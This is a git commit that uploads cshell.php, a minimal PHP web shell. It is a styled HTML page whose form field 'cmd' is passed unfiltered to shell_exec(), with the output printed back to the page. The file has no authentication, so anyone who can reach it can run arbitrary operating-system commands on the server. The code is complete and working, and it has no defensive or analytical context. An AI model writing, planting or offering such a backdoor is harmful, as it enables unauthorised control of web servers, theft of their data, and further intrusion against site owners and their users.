98a1a9c6159dc1cb04fbec98374e060427bf0806
Cozmo <90281965+Cozmo007@users.noreply.github.com>
2022-06-26 04:41:15 -0300

    Add files via upload

---
+++ cshell.php
@@ -0,0 +1,64 @@
+<!DOCTYPE html>
+<head>
+  <meta charset="utf-8">
+  <title>CSH</title>
+</head>
+<body>
+<h1>CSHELL</h1>
+<hr color="red">
+<main class="sh">
+<form method="post">
+<p>cozmo@php-shell:~#<input type="text" class="cm" name="cmd">
+<input type="submit" class="acao" name="run" value="run"/></p>
+</form>
+
+<style>
+h1 {
+   color: white;
+   font-family: Fantasy;
+}
+body {
+   background-color: black;
+}
+.sh{
+    // width: 980px;
+    // height: 700px;  
+     background-color: black;
+     border-radius: 10px;
+     border-color: #bbb;
+ }
+ p {
+     color: white;
+     font-family: Verdana;
+ }
+ .cm {
+     background-color: black;
+     border-color: red;
+     color: blue;
+ }
+ .acao {
+     background-color: black;
+     border-color: red;
+     border-radius: 6px;
+     color: yellow;
+ }
+ .saida{
+    color: #00FF00;
+    font-size: 16px;
+    font-family: Monospace;
+ }
+ </style>
+ <p class="saida">
+ <?php
+ if(isset($_POST["run"])){
+     $comando = $_POST["cmd"];
+     $exec = shell_exec($comando);
+     echo $exec."<br>";
+ }
+ ?>
+ </p>
+ <hr color="red">
+ </main>
+ 
+ </body>
+ </html>
